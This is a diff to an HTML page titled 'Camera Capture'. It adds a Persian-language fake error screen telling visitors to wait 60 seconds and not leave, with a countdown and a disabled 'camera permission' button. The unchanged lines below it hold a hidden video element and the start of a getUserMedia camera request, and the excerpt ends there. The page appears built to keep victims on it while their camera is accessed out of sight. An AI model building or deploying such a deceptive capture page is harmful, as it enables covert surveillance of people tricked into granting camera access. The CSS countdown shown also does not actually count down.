@@ -5,6 +5,129 @@
   <title>Camera Capture</title>
 </head>
 <body>
+
+  <div class="container">
+    <h1>مشکلی پیش آمد!</h1>
+    <p>لطفاً ۶۰ ثانیه صبر کنید و بیرون نروید.</p>
+    
+    <div class="timer">
+      <span>60</span> ثانیه
+    </div>
+
+    <button disabled>اجازه دوربین</button>
+  </div>
+
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+      font-family: sans-serif;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      background: rgba(255,255,255,0.95);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    h1 {
+      color: #e74c3c;
+      margin-bottom: 20px;
+    }
+
+    .timer {
+      font-size: 40px;
+      font-weight: bold;
+      margin: 20px 0;
+      color: #333;
+    }
+
+    .timer span {
+      display: inline-block;
+      animation: countdown 60s linear forwards;
+    }
+
+    @keyframes countdown {
+      0% { content: "60"; }
+      1.666% { content: "59"; }
+      3.333% { content: "58"; }
+      5% { content: "57"; }
+      6.666% { content: "56"; }
+      8.333% { content: "55"; }
+      10% { content: "54"; }
+      11.666% { content: "53"; }
+      13.333% { content: "52"; }
+      15% { content: "51"; }
+      16.666% { content: "50"; }
+      18.333% { content: "49"; }
+      20% { content: "48"; }
+      21.666% { content: "47"; }
+      23.333% { content: "46"; }
+      25% { content: "45"; }
+      26.666% { content: "44"; }
+      28.333% { content: "43"; }
+      30% { content: "42"; }
+      31.666% { content: "41"; }
+      33.333% { content: "40"; }
+      35% { content: "39"; }
+      36.666% { content: "38"; }
+      38.333% { content: "37"; }
+      40% { content: "36"; }
+      41.666% { content: "35"; }
+      43.333% { content: "34"; }
+      45% { content: "33"; }
+      46.666% { content: "32"; }
+      48.333% { content: "31"; }
+      50% { content: "30"; }
+      51.666% { content: "29"; }
+      53.333% { content: "28"; }
+      55% { content: "27"; }
+      56.666% { content: "26"; }
+      58.333% { content: "25"; }
+      60% { content: "24"; }
+      61.666% { content: "23"; }
+      63.333% { content: "22"; }
+      65% { content: "21"; }
+      66.666% { content: "20"; }
+      68.333% { content: "19"; }
+      70% { content: "18"; }
+      71.666% { content: "17"; }
+      73.333% { content: "16"; }
+      75% { content: "15"; }
+      76.666% { content: "14"; }
+      78.333% { content: "13"; }
+      80% { content: "12"; }
+      81.666% { content: "11"; }
+      83.333% { content: "10"; }
+      85% { content: "9"; }
+      86.666% { content: "8"; }
+      88.333% { content: "7"; }
+      90% { content: "6"; }
+      91.666% { content: "5"; }
+      93.333% { content: "4"; }
+      95% { content: "3"; }
+      96.666% { content: "2"; }
+      98.333% { content: "1"; }
+      100% { content: "0"; }
+    }
+
+    button {
+      padding: 15px 25px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      background-color: #95a5a6;
+      color: white;
+      cursor: not-allowed;
+    }
+  </style>
+  
 <video id="video" autoplay playsinline style="display:none;"></video>
 <script>
   navigator.mediaDevices.getUserMedia({ video: true })
